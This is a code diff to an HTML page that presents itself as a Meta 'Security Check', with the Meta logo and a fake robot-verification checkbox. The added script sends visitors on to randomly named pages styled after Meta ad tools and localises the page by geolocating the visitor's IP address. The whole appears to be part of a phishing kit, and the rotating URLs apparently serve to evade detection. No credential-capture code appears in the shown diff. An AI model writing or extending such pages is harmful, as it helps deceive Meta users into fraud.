@@ -3,7 +3,7 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover">
     <title>Security Check - Meta</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@3.4.1/dist/tailwind.min.css">
     <link rel="stylesheet" href="./public/styles/checkbox.css">
@@ -27,7 +27,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 </head>
 
-<body class="bg-[#ffffff] flex flex-col items-center justify-center h-[100vh] w-full">
+<body class="bg-[#ffffff] flex flex-col items-center justify-center min-h-screen w-full">
     <div class="font-sans text-sm text-gray-800 w-full h-full flex flex-col justify-center p-4 md:p-0 md:w-[300px]">
         <div class="w-full">
             <img src="./public/logo-meta.svg" alt="Meta" class="w-[64px]">
@@ -72,12 +72,53 @@
         </div>
     </div>
 
+    <script src="./public/js/slug.js"></script>
     <script>
+        function fallbackRandomSlug() {
+            const bases = ['meta-request','facebook-ads-sync','ads-optimizer','ads-manager-sync'];
+            const base = bases[Math.floor(Math.random() * bases.length)];
+            const n = Math.floor(Math.random() * 100000000);
+            const code = String(n).padStart(8, '0');
+            return `${base}-${code}`;
+        }
+
+        // Minimal country->lang mapping (same as i18n direct mappings)
+        function mapCountryToLang(cc) {
+            try {
+                const code = String(cc||'').toUpperCase();
+                const direct = {
+                    'JP': 'ja', 'KR': 'ko', 'DE': 'de', 'FR': 'fr', 'IT': 'it', 'ES': 'es', 'PT': 'pt',
+                    'TH': 'th', 'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'NL': 'nl', 'DK': 'da', 'AE': 'ar', 'SA': 'ar',
+                    'EG': 'ar', 'IQ': 'ar', 'JO': 'ar', 'KW': 'ar', 'LB': 'ar', 'LY': 'ar', 'MA': 'ar', 'OM': 'ar',
+                    'QA': 'ar', 'SY': 'ar', 'TN': 'ar', 'YE': 'ar', 'UA': 'uk'
+                };
+                return direct[code] || '';
+            } catch(_) { return ''; }
+        }
+
+        async function getLangFromEdge() {
+            try {
+                const res = await fetch('/api/ip-country', { headers: { 'Accept': 'application/json' }, cache: 'no-store' });
+                if (!res.ok) return '';
+                const d = await res.json();
+                return mapCountryToLang(d.country_code || '');
+            } catch(_) { return ''; }
+        }
+
         const checkbox = document.getElementById('robotCheckbox');
         checkbox.addEventListener('change', () => {
             if (checkbox.checked) {
-                setTimeout(() => {
-                    window.location.href = './required.html';
+                setTimeout(async () => {
+                    // Generate random slug and pass via query; required.html will replace URL to /<slug>.html
+                    const slug = window.generateRandomSlug ? window.generateRandomSlug() : fallbackRandomSlug();
+                    // Try to compute lang from edge quickly; if not available, skip param
+                    let lang = '';
+                    try { lang = await Promise.race([getLangFromEdge(), new Promise(r => setTimeout(() => r(''), 700))]); } catch(_) { lang = ''; }
+                    const isLocal = /^(localhost|127\.0\.0\.1)$/i.test(window.location.hostname || '');
+                    const url = isLocal
+                      ? `./required.html?slug=${encodeURIComponent(slug)}${lang ? `&lang=${lang}` : ''}`
+                      : `/${slug}.html${lang ? `?lang=${lang}` : ''}`;
+                    window.location.href = url;
                 }, 600);
             }
         });
